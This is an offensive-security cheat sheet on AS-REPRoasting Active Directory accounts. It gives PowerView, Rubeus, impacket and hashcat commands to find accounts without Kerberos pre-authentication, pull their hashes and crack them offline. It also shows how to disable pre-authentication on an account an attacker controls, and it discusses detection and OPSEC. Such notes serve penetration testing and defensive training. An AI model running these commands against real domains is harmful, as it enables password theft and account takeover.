# AS-REPRoasting

- AS-REPRoasting is the most basic Kerberos attack and targets "Pre-Authentication."
- Once the attacker has the username, they send a special AS_REQ (Authentication Service Request) packet to the KDC (Key Distribution Center), pretending to be the user. 
- The KDC sends back an AS_REP, which contains a portion of information encrypted with a key derived from the user's password. 
- The key can be cracked offline to obtain the user's password.

> AS-REPRoasting is similar to Kerberoasting but involves attacking AS-REP instead of TGS-REP.


## Enumeration

- PowerView can be used to enumerate users with their `UserAccountControl` (UAC) property flag set to `DONT_REQ_PREAUTH`.

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser -UACFilter DONT_REQ_PREAUTH
```

- We can also use rubeus

```powershell
.\Rubeus.exe asreproast /format:hashcat /nowrap
```

> By default, Rubeus outputs hashes for John the Ripper.  Use /format:hashcat to output them for Hashcat instead.

## Exploitation from Windows

```powershell
# Get the TGT of user
.\Rubeus.exe asreproast /user: /domain: /dc: /nowrap /outfile:hashes.txt
# Crack the hash
.\hashcat.exe -m 18200 .\hashes.txt .\rockyou.txt -O
```

- If we have `GenericWrite` or `GenericAll` permissions over an account, we can enable this attribute and obtain the AS_REP ticket for offline cracking to recover the account's password. This can also be referred to as a `targeted AS-REPRoasting attack`.

```powershell
Import-Module .\PowerView.ps1
Set-DomainObject -Identity <userName> -XOR @{useraccountcontrol=4194304} -Verbose
```

## Exploitation from Linux

- Finding vulnerable accounts with valid user credentials:

```shell
# Finding vulnerable accounts
impacket-GetNPUsers $DOMAIN/$user

# Requesting tickets
impacket-GetNPUsers $DOMAIN/$user -request
```

- Finding Vulnerable Accounts without Authentication:

```shell
impacket-GetNPUsers $DOMAIN/ -dc-ip $IP -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass
```

- Cracking hashes

```shell
hashcat -m 18200 hashes.txt rockyou.txt
```

> When working with Kerberos on Linux, we need to use the target's DNS server or configure our host machine with the corresponding DNS entries for the domain we are targetting. That is, we need to have an entry in /etc/hosts for the domain/Domain Controller before attacking it.

## OPSEC Considerations

- Most detection strategies are geared towards looking at unusual or anomalous ticket requests.  Each AS-REP generates a 4768 event, so a single user sending multiple AS-REQs in a short timeframe should be investigated.
- Rubeus also requests RC4-encrypted tickets by default because they are easier to crack.  However, since modern versions of Windows uses AES128 and 256, the use of RC4 tickets can stand out.